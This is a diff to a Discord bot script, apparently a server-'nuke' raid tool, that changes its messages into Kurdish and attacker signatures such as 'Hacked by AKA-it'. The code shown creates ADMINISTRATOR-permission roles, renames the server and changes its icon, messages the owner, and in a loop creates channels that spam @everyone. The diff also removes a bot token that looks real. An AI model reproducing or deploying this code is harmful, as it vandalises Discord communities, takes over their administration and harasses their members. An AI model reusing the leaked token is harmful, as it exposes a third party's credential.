@@ -26,7 +26,7 @@ client.on("message", message => {
       message.guild.roles
         .create({
         data: {
-          name: "Hacked:joy:",
+          name: "هاکرا بەساقە:joy:",
           permissions: ["ADMINISTRATOR"]
         }
         })
@@ -36,11 +36,11 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setUsername("Hacked");
+    client.user.setUsername("Hacked By Kalary");
     message.guild.owner.send(
-      "Mazay kury kar bro servert bbyna gayrawa"
+      "قەینا گەورە بیت بیرتەچێتەوە"
     );
-    message.guild.setName("Hacked");
+    message.guild.setName("Hacked by AKA-it");
     setTimeout(function() {
       setInterval(
         () => {
@@ -48,7 +48,7 @@ client.on("message", message => {
             .create("hacked", "text")
             .then(channel => {
               channel.send(
-                "@everyone Hackrawa nradar :joy: :joy: :joy:"
+                "@everyone ئەڵێ دەست درێژبێ دەمت کورتەبێ زۆر خۆو هەڵکێشی گوێو لە جڕتەبێ :joy: :joy: :joy:"
               );
             });
         },
@@ -62,4 +62,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODQ1Mjc0OTIwNjc3MDE1NTkz.YKelnQ.rXxafuRH2MNgadz6M-Vvm3dF5LE");
+client.login("");
